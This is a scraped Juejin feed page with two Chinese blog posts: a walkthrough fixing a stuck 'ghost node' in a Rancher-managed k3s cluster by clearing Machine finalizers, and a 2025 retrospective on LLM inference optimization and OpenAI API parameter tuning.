.task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">幽灵节点导致Rancher状态卡死Updating</h2>
<h3 data-id="heading-1">问题背景</h3>
<p>本地测试环境通过 Rancher 部署并管理本地 <strong>k3s</strong> 集群</p>
<p>Rancher 本身运行正常，可添加节点通过 UI 和 local 集群的 shell 操作 Kubernetes</p>
<h3 data-id="heading-2">问题现象</h3>
<p>K8s 集群custom-2d74d4c9a104节点状态一直显示：Waiting for agent to check in and apply initial plan</p>
<p>集群轮换证书时会一直卡在此节点后阻碍其它节点的操作（不仅仅限于证书轮换）</p>
<p>configuring etcd node(s) custom-898d97f03763: waiting for plan to be applied</p>
<h3 data-id="heading-3">排查步骤</h3>
<p>1、因集群中<strong>Machine</strong>名称无法与<strong>K8s</strong>节点名称对应，需先对应是哪一个节点出了问题</p>
<ul>
<li>
<p>可使用排除法，因为正常的节点会显示<strong>node</strong>名称</p>
</li>
<li>
<p>通过<strong>rancher2_connection_info.json</strong>文件查看 <strong>secretName</strong>名称，取出名称后做一一对应</p>
<pre><code class="hljs language-shell" lang="shell">cat /var/lib/rancher/agent/rancher2_connection_info.json
{
  ......
  "namespace": "fleet-default",
  "secretName": "custom-f489526f114a-machine-plan"
}
</code></pre>
</li>
</ul>
<p>通过以上方案排查出异常节点为 <strong>dev-k8s-node01</strong></p>
<p>2、确定异常节点后，查看 <strong>node01</strong> 的 <strong>rancher2_connection_info.json</strong> 文件，可以看到node01的 <strong>custom-id</strong> 在 <strong>rancher</strong> 中不存在，而 <strong>rancher</strong> 中的 <strong>custom-id</strong> 在所有节点中均不存在</p>
<p>3、查看 <strong>node01</strong> 服务器上 <strong>rancher-system-agent</strong> 服务状态，能看到服务一直启动失败并一直试图自动重启，查看服务相关日志，可以看到服务启动后尝试连接集群，但是因为证书验证失败无法加入</p>
<pre><code class="hljs language-shell" lang="shell">[root@dev-k8s-node01 ~]# journalctl -xefu rancher-system-agent
1月 15 16:04:02 dev-k8s-node01 systemd[1]: Started Rancher System Agent.
-- Subject: Unit rancher-system-agent.service has finished start-up
-- Defined-By: systemd
-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel
-- 
-- Unit rancher-system-agent.service has finished starting up.
-- 
-- The start-up result is done.
1月 15 16:04:02 dev-k8s-node01 rancher-system-agent[6042]: time="2026-01-15T16:04:02+08:00" level=info msg="Rancher System Agent version v0.3.3 (9e827a5) is starting"
1月 15 16:04:02 dev-k8s-node01 rancher-system-agent[6042]: time="2026-01-15T16:04:02+08:00" level=info msg="Using directory /var/lib/rancher/agent/work for work"
1月 15 16:04:02 dev-k8s-node01 rancher-system-agent[6042]: time="2026-01-15T16:04:02+08:00" level=info msg="Starting remote watch of plans"
1月 15 16:04:03 dev-k8s-node01 rancher-system-agent[6042]: time="2026-01-15T16:04:03+08:00" level=fatal msg="error while connecting to Kubernetes cluster: the server has asked for the client to provide credentials"
1月 15 16:04:03 dev-k8s-node01 systemd[1]: rancher-system-agent.service: main process exited, code=exited, status=1/FAILURE
1月 15 16:04:03 dev-k8s-node01 systemd[1]: Unit rancher-system-agent.service entered failed state.
1月 15 16:04:03 dev-k8s-node01 systemd[1]: rancher-system-agent.service failed.
1月 15 16:04:08 dev-k8s-node01 systemd[1]: rancher-system-agent.service holdoff time over, scheduling restart.
1月 15 16:04:08 dev-k8s-node01 systemd[1]: Stopped Rancher System Agent.
-- Subject: Unit rancher-system-agent.service has finished shutting down
-- Defined-By: systemd
-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel
-- 
-- Unit rancher-system-agent.service has finished shutting down.
</code></pre>
<h3 data-id="heading-4">解决步骤</h3>
<p>1、通过 <strong>Rancher</strong> 控制台的 <strong>local</strong> 集群打开 <strong>kubectl shell</strong> 控制台，在控制台中执行强制删除命令，命令执行完成后返回 <strong>force delete</strong> 但是资源仍然存在</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">&gt; </span><span class="bash">kubectl -n fleet-default delete machine custom-2d74d4c9a104 --force</span>
</code></pre>
<p>2、通过 <strong>Rancher</strong> 控制台的 <strong>local</strong> 集群打开 <strong>kubectl shell</strong> 控制台，删除 <strong>custom</strong> 节点对应的 <strong>finalizers</strong> 条目，执行完成后 <strong>custom</strong> 节点被自动清理</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">&gt; </span><span class="bash">kubectl edit machine custom-2d74d4c9a104 -n fleet-default</span>
<span class="hljs-meta prompt_"># </span><span class="bash">找到 finalizers: 部分，删除其下的所有条目，保存退出</span>
</code></pre>
<p>3、<strong>custom</strong> 节点清理后，可以看到集群开始轮换证书，更新配置等操作</p>
<pre><code class="hljs language-shell" lang="shell">configuring worker node(s) custom-3524fa7f0d71,custom-3b154219b4e1,custom-40e383a8d1da and 10 more
</code></pre>
<p>4、在 <strong>node01</strong> 服务器重新执行 <strong>Registration Command</strong> 命令加入集群</p>
<h3 data-id="heading-5">原因分析</h3>
<h4 data-id="heading-6">Finalizers</h4>
<p>Finalizer 是带有命名空间的键，告诉 Kubernetes 等到特定的条件被满足后， 再完全删除被标记为删除的<a href="https://link.juejin.cn?target=https%3A%2F%2Fkubernetes.io%2Fzh-cn%2Fdocs%2Freference%2Fusing-api%2Fapi-concepts%2F%23standard-api-terminology" target="_blank" title="https://kubernetes.io/zh-cn/docs/reference/using-api/api-concepts/#standard-api-terminology" ref="nofollow noopener noreferrer">资源</a>。 Finalizer 提醒<a href="https://link.juejin.cn?target=https%3A%2F%2Fkubernetes.io%2Fzh-cn%2Fdocs%2Fconcepts%2Farchitecture%2Fcontroller%2F" target="_blank" title="https://kubernetes.io/zh-cn/docs/concepts/architecture/controller/" ref="nofollow noopener noreferrer">控制器</a>清理被删除的对象拥有的资源。</p>
<p>当你告诉 Kubernetes 删除一个指定了 Finalizer 的对象时， Kubernetes API 通过填充 <code>.metadata.deletionTimestamp</code> 来标记要删除的对象， 并返回 <code>202</code> 状态码（HTTP "已接受"）使其进入只读状态。 此时控制平面或其他组件会采取 Finalizer 所定义的行动， 而目标对象仍然处于终止中（Terminating）的状态。 这些行动完成后，控制器会删除目标对象相关的 Finalizer。 当 <code>metadata.finalizers</code> 字段为空时，Kubernetes 认为删除已完成并删除对象。</p>
<p>在 Kubernetes 架构中，<code>Finalizers</code> 是一种<strong>资源清理保护机制</strong>。确保在删除一个对象前，与其关联的外部资源（如云平台的负载均衡器、磁盘卷或 Rancher 的管理 Agent）能够被优雅地清理。当 <code>finalizers</code> 列表为空时，K8s 才会真正从 Etcd 中擦除该数据。</p>
<h4 data-id="heading-7">为何产生“幽灵节点”？</h4>
<p><strong>触发点</strong>：由于 node01 的 Agent 凭证失效，导致 node01 无法向 Rancher Server 上报状态。</p>
<p><strong>状态异常</strong>：Rancher 认为该节点失联，尝试重新同步或用户尝试删除该节点以重建。</p>
<p><strong>清理阻塞</strong>：<code>machine</code> 资源上存在的 Finalizers无法确认清除。Rancher 的控制器在尝试清理该节点时，需要通过 Agent 下发指令，但此时 <strong>Agent 连接已断开</strong>。</p>
<p><strong>幽灵化</strong>：清理逻辑由于通信失败而卡死，<code>Finalizers</code> 永远无法被移除，导致该节点资源在 UI 中一直存在，但又无法与实际运行的 k3s 节点建立有效连接。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[聚焦大模型落地：2025 年推理优化、MCP 探索与部署权衡的实战心得]]></title>    <link>https://juejin.cn/post/7595615310180646966</link>    <guid>https://juejin.cn/post/7595615310180646966</guid>    <pubDate>2026-01-16T09:13:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595615310180646966" data-draft-id="7595527937833402422" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="聚焦大模型落地：2025 年推理优化、MCP 探索与部署权衡的实战心得"/> <meta itemprop="keywords" content="算法,后端,架构"/> <meta itemprop="datePublished" content="2026-01-16T09:13:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="fanstuck"/> <meta itemprop="url" content="https://juejin.cn/user/3927915182964183"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            聚焦大模型落地：2025 年推理优化、MCP 探索与部署权衡的实战心得
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3927915182964183/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    fanstuck
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:13:24.000Z" title="Fri Jan 16 2026 09:13:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读32分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>2025年对我来说是充满挑战和收获的一年。这一年里，我聚焦于大模型应用落地与推理优化，从工程实践中总结经验。从提升大模型推理性能、调优OpenAI API参数，到探索新兴的MCP协议以及反思大模型对开发者工作的影响，我经历了技术与思维范式的转变。在这篇年度复盘中，我将围绕几个关键主题分享我的心得，希望为各位开发者提供有价值的参考。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e9bce9b57f046efbb91d92f09fc1408~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=yE7sb25o7IBdxYmI1SabWcWNYkk%3D" alt="4e294c9b7cda85462ddc05faa8170148.gif" loading="lazy"/></p>
<h3 data-id="heading-1">一、大模型推理优化：挑战与解决策略</h3>
<p>大型语言模型的推理性能直接决定了AI系统给用户响应的速度和体验。即使是毫秒级的延迟增加，累计到数百万用户规模也会显著拉低满意度，影响业务收益。实际项目中，我深刻体会到推理优化不仅是技术问题，更关系到用户体验和企业盈利。举个现实案例：某电商平台上线AI购物助手时，模型推理延迟超过5秒，导致大量用户流失、转化率低迷；后来通过模型优化、批处理推理和推理框架升级（TensorRT），性能提升了数倍，延迟降至毫秒级，用户体验显著改善。这个案例直观证明了优化推理带来的巨大业务价值。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52b0eb2ae80c44beb4d7775bada18df9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=DfSSm460lOVux%2FzTbUlH5%2FbWLEo%3D" alt="图片.png" loading="lazy"/></p>
<p>然而，大模型推理的优化难度也让我屡屡碰壁。总结来看，主要挑战包括：</p>
<ul>
<li>模型超大，内存占用高：最新的大模型参数动辄数百亿甚至上万亿，每次推理相当于“翻遍图书馆找答案”，内存开销巨大。就像电脑同时打开上百个网页会耗尽内存，大模型推理也面临类似风险。</li>
<li>GPU算力利用不足：GPU很强大，但如果模型设计或部署不合理，常常只有30%左右的利用率，大量算力闲置。有点像开着法拉利在市区堵车，性能完全跑不出来，结果推理延迟高、成本反而上涨。</li>
<li>CPU↔GPU数据传输瓶颈：推理过程中频繁的数据拷贝会带来严重延迟。这就像服务员每次只端一小盘菜在厨房和餐桌间来回跑，效率奇低。在需要处理大量数据的场景（例如视频流分析）尤为突出。</li>
<li>模型结构冗余计算：大模型网络结构复杂，往往存在不必要的重复计算。就像导航让你绕远路，明明直线最优却平添许多无用功。一些未优化的Transformer模型每次推理都有大量冗余步骤，严重拖慢了速度。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/986b70d3d8e24ad78168fe6e7d4d2336~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=XH3GGxJ3%2Ba8JQMgl4%2Fs%2BvTzLQWc%3D" alt="图片.png" loading="lazy"/></p>
<p>上述因素叠加，使大模型推理优化成为一个系统性难题。认识这些瓶颈后，我针对性地实施了一系列优化策略，总体原则是在尽量不影响模型效果的前提下，压榨出每一分性能：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a67a0eefeeb8473db2ea2854ed85646c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=GNG5xS5qy2%2F5BbTN3BIa64x7%2By8%3D" alt="图片.png" loading="lazy"/></p>
<p>模型压缩与轻量化：通过模型量化将权重从FP32降低到FP16甚至INT8，减少内存占用和计算量；以及剪枝（Pruning）去除冗余连接，精简模型规模。例如我将部分Transformer权重量化为INT8后，模型大小缩减一半以上，推理提速明显（需注意低精度可能带来精度损失，需要权衡业务容错度）。同时采用知识蒸馏（Distillation），用小模型学习大模型的行为，在保持大部分能力的情况下极大降低计算需求—我曾将一个无法在手机运行的Qwen-14b级别模型蒸馏出一个轻量版部署在手机端，实现了流畅响应。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/047a4d12e26a4b07833baec25fcf53f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=akoQ82qdWtqKJUBlQVs1%2F0wF77A%3D" alt="图片.png" loading="lazy"/></p>
<p>模型架构优化：针对实时对话、在线推荐这类低延迟场景，我倾向用精简架构的模型替换原始大模型。例如用 DistilBERT、TinyGPT 这类蒸馏/裁剪模型替换繁重的完整版模型，在略微牺牲精度的情况下换取数倍的推理提速。这就像打造一辆只保留核心功能、去掉累赘装饰的赛车，只为追求速度。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/448b1e9a0dd94afe9965d9e4febf17dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=WzD1Ao%2BoDmAkhXAnWxZ8E7n8OQc%3D" alt="图片.png" loading="lazy"/></p>
<p>推理框架与硬件加速：选择合适的推理引擎对性能至关重要。我根据项目需求在不同方案间切换：本地部署快速原型时使用简单易用的框架，如 Ollama（资源占用低，部署方便）；追求极致性能时，则使用高性能推理服务或优化库，如 vLLM（具备批量调度等优化，能充分利用高端硬件并发）或 NVIDIA TensorRT（对GPU做深度图优化和算子融合）。例如在一项需处理大规模并发请求的服务中，我将模型部署切换到vLLM，利用其高效的连续批处理机制，让GPU吞吐能力大幅提升；又在GPU集群上借助TensorRT对模型计算图进行了编译优化，最终单机QPS提高了数倍。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c97ceec28bb45e3b96b419ae427eae4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=bwH9pHHdOFvmYAkzOX6rpfcQc2Y%3D" alt="图片.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5335c76247754d7ea323de12ab7d68a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=MYZlqeRgSdDfakgOw4%2BC3QUjViw%3D" alt="图片.png" loading="lazy"/></p>
<p>算子级别优化：通过融合算子、优化GPU内核来减少不必要的开销。我使用 PyTorch JIT 将模型脚本化，自动将多个连续算子融合为一个，减少中间内存读写和调度开销。例如，通过下面一行代码对模型进行脚本化：</p>
<p>scripted_model = torch.jit.script(model) # 脚本化模型以自动执行算子融合优化</p>
<p>PyTorch 会分析模型计算图，自动识别并融合可合并的算子，相当于把多步运算合成一步。无需手工改模型代码，就完成了算子级优化，大幅加快推理速度。</p>
<p>推理流水线并行：我将推理过程拆分为输入预处理 → 模型推理 → 输出后处理等阶段，通过流水线并行处理不同阶段，尽量消除各环节之间的等待时间。比如当模型在处理前一个请求时，下一请求的数据预处理已经在CPU上并行进行，再下一个请求的后处理也在同步进行。这样多段流水线重叠运行，整体延迟显著降低。如同餐厅后厨并行备菜、炒菜、装盘，提高了出菜速度。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed97d0b7f3db46d982bf1b20fdba7494~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=bsWxsODORorVhehpNetlM95YFlc%3D" alt="图片.png" loading="lazy"/></p>
<p>经过上述多管齐下的优化，我在多个项目中将大模型推理从“勉强能跑”提升到了“高效好用”的水平。需要强调的是，优化手段的选择没有通用最优解，必须结合具体业务场景和硬件条件综合考量。有时需要同时应用多种手段并配合细致的实验调参，才能找到性能、成本和效果的最佳平衡点——但当你看到优化后的模型毫秒级响应、服务器资源利用率显著提升时，这一切付出都是值得的。</p>
<h3 data-id="heading-2">二、OpenAI SDK与主流推理框架：调优实践与经验</h3>
<p>在大模型应用开发中，我大量使用了 OpenAI 官方的Python SDK 作为基础接口。之所以选择它，是因为如今业界大多数大模型服务都兼容OpenAI API，而官方SDK本身完善易用、功能全面，能够方便地统一调用各种模型。通过OpenAI SDK这一套接口，不仅可以对接OpenAI自家的GPT-4/3.5模型，也能很容易集成其他厂商的大模型API，实现多模型融合。这种标准化极大加快了开发速度——“一套代码，通用多种模型”。因此在2025年的不少项目里，我都优先采用OpenAI SDK搭建原型，然后再根据需要切换到底层不同模型或框架。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/807c1608f9a94ba09a6867c9dc3e979e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=Bh2qcUft5JIxupDpfDlUSc7L3qk%3D" alt="图片.png" loading="lazy"/></p>
<p>通用多种模型”。因此在2025年的不少项目里，我都优先采用OpenAI SDK搭建原型，然后再根据需要切换到底层不同模型或框架。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4f25f9eee79460e9cc54b67afaebe0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZmFuc3R1Y2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159604&amp;x-signature=IZfcrzWSAXe0x3pVL1iQfYC%2B%2Bf4%3D" alt="" loading="lazy"/></p>
<ul>
<li>**</li>
<li>**</li>
<li>**</li>
<li/>
<li>**</li>
<li>**</li>
<li/>
<li>**</li>
<li/>
<li>**</li>
</ul>
<p>fig:</p>
<p>参数调优是用好OpenAI API的关键。 在实践中，我发现合理设置模型参数往往比盲目换更大模型更有效。OpenAI的ChatCompletion等接口提供了丰富的参数，可以微调生成内容的风格和质量。我常根据不同应用场景调整诸如温度、top_p、惩罚项等参数，以满足需求：</p>
<ul>
<li>客服问答场景：追求准确、简洁。将 temperature 调低到 ~0.2，top_p 调低到 ~0.5，减少回答的随机性，确保严谨一致。同时设定较小的 max_tokens（如100），避免模型啰嗦。</li>
<li>创意内容场景：需要发散、多样。将 temperature 提高到 ~0.8，top_p 提高到 ~0.9，增加随机性和创造力。并适当提高 presence_penalty 和 frequency_penalty，鼓励使用新颖表达、降低重复。</li>
<li>数据分析/报告场景：追求结构化和准确。保持 temperature 较低 (~0.3)，top_p 较低 (~0.6)，让输出确定、一致。同时设置适当的 max_tokens 上限（如200），防止内容截断并确保简洁。</li>
</ul>
<p>通过这些调优，我能精细控制模型回答的随机性、创造性和长度，使之符合预期。相反，如果参数设置不当，模型输出质量会大打折扣。例如：温度设置过高会导致回答天马行空、偏离主题（曾有测试中温度1.2时，询问菜谱却得到“去火星拿番茄”的荒诞答案）；温度设为0则可能使生成过于死板枯燥；max_tokens太小还会让长文回答中途被截断，丢失关键信息。可见，参数犹如调音台的各个滑杆，需要根据场景巧妙配合，找到恰到好处的“火候”。正因如此，掌握参数调优对于开发者来说非常重要——它直接关系到成本控制（如避免不必要的长输出浪费Token）/用户体验（回答是否合适）/业务适配（不同场景下输出风格迥异）等方方面面。</p>
<p>实践心得： 在实际项目中，我常常把调整参数当作与模型对话的艺术：“模型是死的，Prompt和参数才是活的”。遇到模型回答偏差，我不会一味抱怨模型不好用，而是先反思是否提示词(prompt)和参数没调优。当我耐心地调低一点温度、增加一点罚值，再次提问时，模型往往会给出令人满意的回应。这种调参过程其实是加深对模型脾性的了解——就像训马一样，慢慢摸索出缰绳的用力方式。</p>
<p>除了OpenAI云服务，今年我也探索了多种本地化的大模型推理框架，以满足不同部署需求。这些开源或第三方框架各有特点：</p>
<ul>
<li>Ollama – 主打一键本地部署和轻量级运行。它对资源要求低，安装使用非常简单，适合对速度要求不高但希望快速离线运行模型的场景。在资源受限的设备上（如笔记本电脑），Ollama往往是不错的选择，因为它占用少、易上手。</li>
<li>vLLM – 强调高性能服务的大模型推理库。vLLM内部采用了高效的连续批处理和内存管理技术，能够在有足够硬件支持的情况下，实现比传统方案更低的延迟和更高的吞吐。如果有较强的GPU算力，并发请求量也大，那么选择vLLM可以充分榨干硬件性能，获得业界领先的推理效率。</li>
<li>TensorRT – NVIDIA提供的深度学习推理引擎，专注于极致的GPU性能优化。通过模型层融合、kernel autotune等手段，把模型在GPU上的执行效率推到极限。我在项目中使用TensorRT对模型进行优化编译后，单卡推理延迟减少了数倍，非常适合对速度要求极高的云端服务。不过，TensorRT集成相对复杂，需要一定的GPU编程经验来排查兼容性和精度问题，但一旦调通，收获的性能提升也是巨大的。</li>
</ul>
